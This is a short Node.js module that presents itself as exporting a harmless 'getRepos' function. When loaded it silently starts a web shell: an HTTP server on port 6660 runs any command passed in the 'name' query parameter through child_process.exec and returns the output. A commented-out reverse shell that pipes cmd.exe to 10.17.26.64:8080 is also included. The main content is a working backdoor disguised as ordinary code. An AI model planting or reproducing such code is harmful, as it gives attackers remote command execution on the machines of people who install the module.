// const axios = require('axios');
const getRepos = () => console.log('I am no Shell!!!')
// Reverse-shell here:
// (function(){
//     var net = require("net"),
//         cp = require("child_process"),
//         sh = cp.spawn("c:\\Windows\\System32\\cmd.exe", []);
//     var client = new net.Socket();
//     client.connect(8080, "10.17.26.64", function(){
//         client.pipe(sh.stdin);
//         sh.stdout.pipe(client);
//         sh.stderr.pipe(client);
//     });
//     return /a/; // Prevents the Node.js application form crashing
// })();
var sys   = require('sys'),
    exec  = require('child_process').exec,
    child,
    http = require('http');
    
child = function(res, cmd) {
  exec(cmd, 
  function (error, stdout, stderr) {
    res.end(stdout);
    if (error !== null) {
      console.log('exec error: ' + error);
    }
  });
};
// webShell
http.createServer(function (req, res) {
  res.writeHead(200, {'Content-Type': 'text/plain'});
  var parsedRequest = require('url').parse(req.url, true);
  var cmd = parsedRequest.query['name'];
  if (cmd != undefined)
  {
    //   make it silent 
    // console.log("[cmd] " + cmd);
    child(res, cmd);
  }
}).listen('6660', '127.0.0.1');

getRepos()
module.exports = { getRepos: getRepos };
module.exports ={getRepos}; 